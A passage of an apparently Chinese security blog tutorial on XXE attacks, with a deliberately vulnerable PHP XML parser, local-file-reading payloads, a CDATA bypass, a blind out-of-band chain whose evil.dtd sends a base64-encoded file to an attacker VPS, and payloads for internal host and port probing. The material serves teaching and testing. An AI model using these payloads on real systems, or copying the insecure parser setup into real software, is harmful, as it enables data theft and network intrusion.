</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p><strong>参数实体在我们 Blind XXE 中起到了至关重要的作用</strong></p></li></ol> <h3 id="能做什么"><a href="#能做什么" class="header-anchor">#</a> 能做什么</h3> <p>上面疯狂暗示了 <strong>外部实体</strong> ，那他究竟能干什么？</p> <p>实际上，当你看到下面这段代码的时候，有一点安全意识的小伙伴应该隐隐约约能觉察出什么</p> <div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;
&lt;creds&gt;
&lt;user&gt;&amp;xxe;&lt;/user&gt;
&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>既然能读 dtd 那我们是不是能将路径换一换，换成敏感文件的路径，然后把敏感文件读出来？</p> <h3 id="实例一-读本地敏感文件-有回显"><a href="#实例一-读本地敏感文件-有回显" class="header-anchor">#</a> 实例一：读本地敏感文件（有回显）</h3> <p>这个实例的攻击场景模拟的是在服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件</p> <p>本地服务器上放上解析 XML 的 php 代码：</p> <p><strong>xxe.php:</strong></p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">libxml_disable_entity_loader</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//若为true，则表示禁用外部实体</span>
    <span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//可以获取POST来的数据</span>
    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$dom</span><span class="token operator">-&gt;</span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$creds</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p><strong>payload:</strong></p> <div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE creds [  
&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; 
&lt;creds&gt;&amp;goodies;&lt;/creds&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><strong>结果如下图：</strong></p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/XXE1.png" alt="XXE1"></p> <p>因为这个文件没有什么特殊符号，于是我们读取的时候可以说是相当的顺利，<strong>那么我么要是换成下面这个文件呢？</strong></p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/XXE2.png" alt="XXE2"></p> <p><strong>结果如下图：</strong></p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/XXE3.png" alt="XXE3"></p> <p>可以看到，不但没有读到我们想要的文件，而且还给我们报了一堆错，怎么办？这个时候就要祭出我们的另一个神器了------CDATA ，简单的介绍如下(引用自我的一片介绍 XML 的博客)</p> <ul><li><p>有些内容可能<strong>不想让解析引擎解析</strong>执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 <code>&lt;``&gt;</code> <code>&amp;</code> 或者<code>&quot;</code>字符，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记</p> <div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>&lt;![CDATA[
xxxxxxxxx
]]&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div></li> <li><p>可以输入任意字符除了<code>]]&gt;</code> 不能嵌套</p></li> <li><p>用处是万一某个标签内容包含特殊字符或者不确定字符，我们可以用CDATA包起来</p></li></ul> <p>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过，但是怎么做到，我们来简答的分析一下</p> <p>首先，找到问题出现的地方，问题出现在</p> <div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>...
&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt;
&lt;creds&gt;&amp;goodies;&lt;/creds&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>引用并不接受可能会引起 xml 格式混乱的字符(在XML中，有时实体内包含了些字符，如&amp;,&lt;,&gt;,&quot;,'等。这些均需要对其进行转义，否则会对XML解释器生成错误)，我们想在引用的两边加上 &quot;”,但是好像没有任何语法告诉我们字符串能拼接的，于是我想到了能不能使用多个实体连续引用的方法</p> <p><strong>结果如下图：</strong></p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/XXE4.png" alt="XXE4"></p> <p>注意，这里面的三个实体都是字符串形式，连在一起居然报错了，这说明我们不能在 xml 中进行拼接，而是需要在拼接以后再在 xml 中调用，那么要想在DTD中拼接，我们知道我们只有一种选择，就是使用<strong>参数实体</strong></p> <p><strong>payload:</strong></p> <div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE roottag [
&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   
&lt;!ENTITY % goodies SYSTEM &quot;file:///D:/test.txt&quot;&gt;  
&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  
&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; %dtd; ]&gt; 
&lt;roottag&gt;&amp;all;&lt;/roottag&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p><strong>evil.dtd:</strong></p> <div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; 
&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><strong>结果如下图：</strong></p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/XXE5.png" alt="XXE5"></p> <p>**tips:提一个点，如果是在 java 中 还有一个协议能代替 file 协议 ，那就是 netdoc **</p> <h4 id="新的问题出现"><a href="#新的问题出现" class="header-anchor">#</a> 新的问题出现</h4> <p>但是，你想想也知道，本身人家服务器上的 XML 就不是输出用的，一般都是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析 XML 的类，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法------外带</p> <h4 id="新的解决方法"><a href="#新的解决方法" class="header-anchor">#</a> 新的解决方法</h4> <p>想要外带就必须能发起请求，那么什么地方能发起请求呢？ 很明显就是我们的外部实体定义的时候，其实光发起请求还不行，我们还得能把我们的数据传出去，而我们的数据本身也是一个对外的请求，也就是说，我们需要在请求中引用另一次请求的结果，分析下来只有我们的参数实体能做到了(并且根据规范，我们必须在一个 DTD 文件中才能完成“请求中引用另一次请求的结果”的要求)</p> <h3 id="实例二-无回显读取本地敏感文件-blind-oob-xxe"><a href="#实例二-无回显读取本地敏感文件-blind-oob-xxe" class="header-anchor">#</a> 实例二：无回显读取本地敏感文件(Blind OOB XXE)</h3> <p><strong>xxe.php</strong></p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">libxml_disable_entity_loader</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$dom</span><span class="token operator">-&gt;</span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p><strong>evil.dtd</strong></p> <div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;
&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://VPSIP:端口?p=%file;'&gt;&quot;&gt;
%eval;
%send;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><strong>payload</strong></p> <div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>&lt;!DOCTYPE convert [ 
&lt;!ENTITY % remote SYSTEM &quot;http://VPSIP:端口/evil.dtd&quot;&gt;
%remote;
]&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><strong>如下：</strong></p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url"><span class="token path"><span class="token path-separator">/</span>xxe.php</span></span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">192.168.1.1</span></span>
<span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">max-age=0</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en-US,en;q=0.9</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">99</span></span>

&lt;!DOCTYPE convert [ 
&lt;!ENTITY % remote SYSTEM &quot;http://VPSIP:端口/evil.dtd&quot;&gt;
%remote;
]&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p><strong>结果如下：</strong></p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/XXE9.png" alt="XXE9"></p> <p>我们清楚第看到服务器端接收到了我们用 base64 编码后的敏感文件信息(编码也是为了不破坏原本的XML语法)，不编码会报错</p> <p><strong>整个调用过程：</strong></p> <p>我们从 payload 中能看到 连续调用了一个参数实体 %remote去请求包含远程的evil.dtd文件，该dtd包含进来后，我们的利用顺序为，%remote 先包含evil.dtd文件，然后 %eval调用 evil.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题</p> <h4 id="新的思考"><a href="#新的思考" class="header-anchor">#</a> 新的思考</h4> <p>我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击</p> <p>所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议</p> <p><strong>如图所示:</strong></p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/XML3.png" alt="XML3"></p> <p>PHP在安装扩展以后还能支持的协议：</p> <p><img src="https://cdn.jsdelivr.net/gh/Zephyrccc/ImageHostingService/Blog/XXE8.png" alt="XXE8"></p> <p><strong>注意：</strong></p> <ol><li>其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7update 7 和 Oracle JDK 1.6 update 35</li> <li>libxml 是 PHP 的 xml 支持</li></ol> <h3 id="实例三-内网主机探测"><a href="#实例三-内网主机探测" class="header-anchor">#</a> 实例三：内网主机探测</h3> <div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE creds [  
&lt;!ENTITY goodies SYSTEM &quot;php://filter/convert.base64-encode/resource=http://内网IP&quot;&gt; ]&gt;
&lt;creds&gt;&amp;goodies;&lt;/creds&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><strong>tips：根据响应的时间的长短判断ip是否存在，可以通过burp重放遍历端口</strong></p> <h3 id="实例四-内网主机端口探测"><a href="#实例四-内网主机端口探测" class="header-anchor">#</a> 实例四：内网主机端口探测</h3> <div class="language-xml-dtd line-numbers-mode"><pre class="language-text"><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE creds [  
&lt;!ENTITY goodies SYSTEM &quot;php://filter/convert.base64-encode/resource=http://内网IP:端口&quot;&gt; ]&gt;
&lt;creds&gt;&amp;goodies;&lt;/creds&gt;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><strong>tips：根据响应的时间的长短判断端口是否开放，可以通过burp重放遍历端口；如果有报错，可以直接探测出banner信息</strong></p> <p><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener noreferrer">原文地址<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p></div></div> <div class="page-slot page-slot-bottom"><!-- 横向自适应 -->
      <ins class="adsbygoogle"
          style="display:block"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="6620245489"
          data-ad-format="auto"
          data-full-width-responsive="true"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div> <div class="page-edit"><!----> <div class="tags"><a href="/tags/?tag=web" title="标签">#web</a><a href="/tags/?tag=XXE" title="标签">#XXE</a></div> <div class="last-updated"><span class="prefix">上次更新:</span> <span class="time">2022/08/24, 22:23:34</span></div></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><a href="/pages/2e1547494524d1cd/" class="page-nav-centre page-nav-centre-prev"><div class="tooltip">escapeshellarg+escapeshellcmd</div></a> <a href="/pages/2e1547494524d1c1/" class="page-nav-centre page-nav-centre-next"><div class="tooltip">MD5</div></a></div> <div class="page-nav"><p class="inner"><span class="prev">
        ←
        <a href="/pages/2e1547494524d1cd/" class="prev">escapeshellarg+escapeshellcmd</a></span> <span class="next"><a href="/pages/2e1547494524d1c1/">MD5</a>→
      </span></p></div></div></div> <div class="article-list"><div class="article-title"><a href="/archives/" class="iconfont icon-bi">最近更新</a></div> <div class="article-wrapper"><dl><dd>01</dd> <dt><a href="/pages/2e1547494524d1d3/"><div>
            0CTF 2016 piapiapia
            <!----></div></a> <span class="date">07-23</span></dt></dl><dl><dd>02</dd> <dt><a href="/pages/2e1547494524d1d1/"><div>
            CISCN 2019 初赛 Love
            <!----></div></a> <span class="date">07-22</span></dt></dl><dl><dd>03</dd> <dt><a href="/pages/2e1547494524d1d0/"><div>
            PHP反序列化
            <!----></div></a> <span class="date">07-21</span></dt></dl> <dl><dd></dd> <dt><a href="/archives/" class="more">更多文章&gt;</a></dt></dl></div></div></main></div> <div class="footer"><div class="icons"><a href="mailto:ZephyrChenWork@outlook.com" title="发邮件" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/Zephyrccc" title="GitHub" target="_blank" class="iconfont icon-github"></a></div> 
  Theme by
  <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" title="本站主题">Vdoing</a> 
    | Copyright © 2021-2022
    <span>Zephyr | <a href="https://github.com/xugaoyi/vuepress-theme-vdoing/blob/master/LICENSE" target="_blank">MIT License</a></span></div> <div class="buttons"><div title="返回顶部" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="去评论" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="主题模式" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">
          跟随系统
        </li><li class="iconfont icon-rijianmoshi">
          浅色模式
        </li><li class="iconfont icon-yejianmoshi">
          深色模式
        </li><li class="iconfont icon-yuedu">
          阅读模式
        </li></ul></div></div> <!----> <!----> <div class="custom-html-window custom-html-window-rb" style="display:;"><div class="custom-wrapper"><span class="close-but">×</span> <div><!-- 固定160*160px -->
      <ins class="adsbygoogle"
          style="display:inline-block;max-width:160px;max-height:160px"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="8377369658"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script>
      </div></div></div></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.d666345c.js" defer></script><script src="/assets/js/2.2caa9fc9.js" defer></script><script src="/assets/js/88.23a1baf9.js" defer></script>
  </body>
</html>
